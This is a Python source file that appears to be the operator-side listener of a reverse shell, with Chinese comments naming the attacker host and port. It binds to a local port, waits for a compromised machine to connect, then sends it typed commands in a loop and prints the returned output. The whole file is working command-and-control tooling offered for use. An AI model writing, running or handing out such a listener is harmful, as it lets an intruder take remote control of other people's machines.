# -*- coding: utf-8 -*-
import socket,subprocess as sp
import sys
import os
import platform

# 颜色美化函数
def script_colors(color_type,text):
    color_end = '\033[0m'

    if color_type.lower() == "r" or color_type.lower() == "red":
        red = "\033[31m"
        text = red + text + color_end       
    elif color_type.lower() == "underline":
        underline = '\033[4;30m'
        text = underline + text + color_end
    elif color_type.lower() == "b" or color_type.lower() == "blue":
        blue = "\033[34m" 
        text = blue + text + color_end
    elif color_type.lower() == "g" or color_type.lower() == "gree":
        gree = "\033[32m"    
        text = gree + text + color_end
    elif color_type.lower() == "y" or color_type.lower() == "yellow":
        yellow = "\033[33m"   
        text = yellow + text + color_end
    else:
        return text
    return text

def send_data(connection,data):
    try:
        connection.send(data.encode('utf-8'))
    except socket.error as e:
        print (script_colors("red","[ - ]") + "Unable To Send Data")
        return

    result = connection.recv(2048).decode('utf-8')
    total_size = result[:16]
    result = result[16:]

    while int(total_size) > len(result):
        data = connection.recv(2048).decode('utf-8')
        result += data

    return  result.rstrip("\n")



# 主控制函数
def main_control():
    try:
        #host = sys.argv[1]      # 攻击者主机地址
        #port = int(sys.argv[2]) # 攻击者主机端口

        host = "127.0.0.1"
        port = 8000


    except Exception as e:
        print (script_colors("red","[-]") + "Socket Information Not Provided")
        sys.exit(1)

    print (script_colors("g"," [+]") + script_colors("b"," Framework Standard Successfully"))
    

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
    s.bind((host,port))
    s.listen(5)

    if host == "":
        host = "localhost"

    print (script_colors("g", " [info] ") + script_colors("b", "Listening on %s %d ..." % (host, port)))

    try:
        conn,addr = s.accept()
    except KeyboardInterrupt:
        print ("nn " + script_colors("red", "[-]") + script_colors("b", " User Request An Interrupt"))
        sys.exit(0)

    while 1:
        command = input("#> ")
        print(send_data(conn,command))
        
   

  

    s.close() # 关闭套接字

if __name__ == "__main__":
    main_control()
